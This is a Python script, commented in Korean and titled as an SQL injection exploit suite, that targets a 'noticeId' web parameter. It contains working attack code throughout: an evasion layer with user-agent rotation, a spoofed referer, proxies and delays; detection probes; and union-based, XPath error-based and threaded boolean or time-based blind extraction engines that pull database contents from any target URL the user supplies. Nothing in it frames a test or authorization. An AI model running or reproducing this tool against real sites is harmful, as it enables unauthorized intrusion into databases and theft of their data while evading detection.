#!/usr/bin/env python3
import requests
import sys
import time
import random
import re
import binascii
import threading
from pathlib import Path
from tabulate import tabulate
from concurrent.futures import ThreadPoolExecutor
from itertools import cycle

# =========================
# 1. Stealth 네트워크 엔진
# =========================
class StealthNet:
    def __init__(self, use_proxy=False):
        self.ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
        ]
        self.proxies = [] 
        self.proxy_pool = cycle(self.proxies) if self.proxies else None
        self.use_proxy = use_proxy

    def send(self, url, params):
        headers = {'User-Agent': random.choice(self.ua_list), 'Referer': 'https://www.google.com/'}
        proxy = next(self.proxy_pool) if self.use_proxy else None
        time.sleep(random.uniform(0.1, 0.3)) 
        try:
            return requests.get(url, params=params, headers=headers, proxies=proxy, timeout=7)
        except: return None

# =========================
# 2. 통합 취약점 진단 엔진
# =========================
class DiagnosticEngine:
    def __init__(self, url, net):
        self.url = url
        self.net = net

    def run(self):
        print(f"\n[*] Target: {self.url}\n[*] 진단 엔진 가동 중...")
        results = []
        # 1. Error-based 탐지
        r = self.net.send(self.url, {"noticeId": "35'"})
        err = any(e in (r.text if r else "").lower() for e in ["sql syntax", "xpath", "mysql_fetch"])
        results.append(["Error-Based", "높음" if err else "낮음"])
        # 2. Union-based 탐지
        cols = 0
        for i in range(1, 15):
            if self.net.send(self.url, {"noticeId": f"35 ORDER BY {i}"}).status_code != 200:
                cols = i - 1; break
        results.append(["Union-Based", f"성공 ({cols} Cols)" if cols > 0 else "낮음"])
        # 3. Blind 탐지
        r_t = self.net.send(self.url, {"noticeId": "35 AND 1=1"})
        r_f = self.net.send(self.url, {"noticeId": "35 AND 1=2"})
        blnd = len(r_t.text if r_t else "") != len(r_f.text if r_f else "")
        results.append(["Blind-Based", "가능" if blnd else "낮음"])
        
        print(tabulate(results, headers=["공격 유형", "가능성"], tablefmt="grid"))
        return {"error": err, "union_cols": cols, "blind": blnd, "true_sample": r_t.text if blnd else None}

# =========================
# 3. 공격 엔진 모듈 (Union, Error, Blind)
# =========================

class StealthUnionEngine:
    def __init__(self, url, col_count, stealth_net):
        self.url, self.col_count, self.net = url, col_count, stealth_net
        self.data_column, self.magic_str = -1, "MONEY_TOM"
        self.hex_magic = "0x" + binascii.hexlify(self.magic_str.encode()).decode()

    def to_hex(self, text):
        return "0x" + binascii.hexlify(text.encode()).decode()

    def get_data(self, query):
        if self.data_column == -1: return []
        wrapped_query = f"CONCAT({self.hex_magic}, ({query}), {self.hex_magic})"
        cols = ["NULL"] * self.col_count
        cols[self.data_column - 1] = wrapped_query
        payload = f"35 UNION SELECT {','.join(cols)}--"
        response = self.net.send(self.url, {"noticeId": payload})
        return re.findall(f"{self.magic_str}(.*?){self.magic_str}", response.text, re.DOTALL) if response else []

    def run(self):
        print(f"[*] Union 컬럼 탐색 중...")
        for i in range(1, self.col_count + 1):
            cols = ["NULL"] * self.col_count
            cols[i-1] = self.hex_magic
            r = self.net.send(self.url, {"noticeId": f"35 UNION SELECT {','.join(cols)}--"})
            if r and self.magic_str in r.text:
                self.data_column = i
                print(f"[+] 유효 컬럼: {i}번")
                break
        if self.data_column != -1:
            db = self.get_data("SELECT DATABASE()")
            print(f"[+] DB Name: {db[0] if db else 'Unknown'}")

class ErrorBasedExploitEngine:
    def __init__(self, url, stealth_net):
        self.url, self.net = url, stealth_net
        
    def get_data(self, query):
        payload = f"EXTRACTVALUE(1, CONCAT(0x3a, ({query})))"
        response = self.net.send(self.url, {"noticeId": f"35 AND {payload}"})
        if response:
            match = re.search(r"XPATH syntax error: ':(.*?)'", response.text)
            return match.group(1) if match else None
        return None

    def run(self):
        print("[*] Error-Based 엔진 실행...")
        db = self.get_data("SELECT DATABASE()")
        print(f"[+] DB Name: {db}")

class BlindExploitEngine:
    def __init__(self, url, stealth_net, mode="bool"):
        self.url, self.net, self.mode = url, stealth_net, mode
        self.time_delay, self.max_workers, self.true_indicator = 3, 8, None

    def check(self, condition):
        payload = f"IF(({condition}),SLEEP({self.time_delay}),0)" if self.mode == "time" else condition
        start = time.time()
        response = self.net.send(self.url, {"noticeId": f"35 AND {payload}"})
        if self.mode == "time": return (time.time() - start) >= self.time_delay
        return self.true_indicator in response.text if response and self.true_indicator else False

    def extract_str(self, query, max_len=32):
        result = [""] * max_len
        print(f"[*] 추출 중: ", end="", flush=True)
        def worker(pos):
            low, high, char = 32, 126, chr(0)
            while low <= high:
                mid = (low + high) // 2
                if self.check(f"ASCII(SUBSTRING(({query}),{pos},1))>{mid}"):
                    low = mid + 1
                    char = chr(low)
                else: high = mid - 1
            if char != chr(0): sys.stdout.write(char); sys.stdout.flush()
            return char
        with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futures = list(ex.map(worker, range(1, max_len + 1)))
        return "".join(futures).strip(chr(0))

# =========================
# 4. 통합 제어 시스템
# =========================
class IntegratedExploit:
    def __init__(self, url):
        self.url = url
        self.net = StealthNet()
        self.diag = DiagnosticEngine(url, self.net)

    def start(self):
        status = self.diag.run()
        print("\n[!] 수행할 공격 모드를 선택하십시오.")
        print(" 1. Union-Based\n 2. Error-Based\n 3. Blind (Boolean)\n 4. Blind (Time)\n Q. Quit")
        choice = input("\n[Select] > ").strip()
        
        if choice == '1' and status['union_cols'] > 0:
            engine = StealthUnionEngine(self.url, status['union_cols'], self.net)
            engine.run()
        elif choice == '2' and status['error']:
            engine = ErrorBasedExploitEngine(self.url, self.net)
            engine.run()
        elif choice in ['3', '4']:
            mode = "bool" if choice == '3' else "time"
            engine = BlindExploitEngine(self.url, self.net, mode)
            if mode == "bool":
                engine.true_indicator = input("[?] True Indicator (e.g., 'notice'): ").strip()
            print(f"[+] DB Name: {engine.extract_str('SELECT DATABASE()')}")
        else:
            print("[!] 종료합니다.")

if __name__ == "__main__":
    print("=== TOTAL SQLi EXPLOIT SUITE v5.0 ===")
    target = input("[?] Target URL: ").strip()
    if target: IntegratedExploit(target).start()
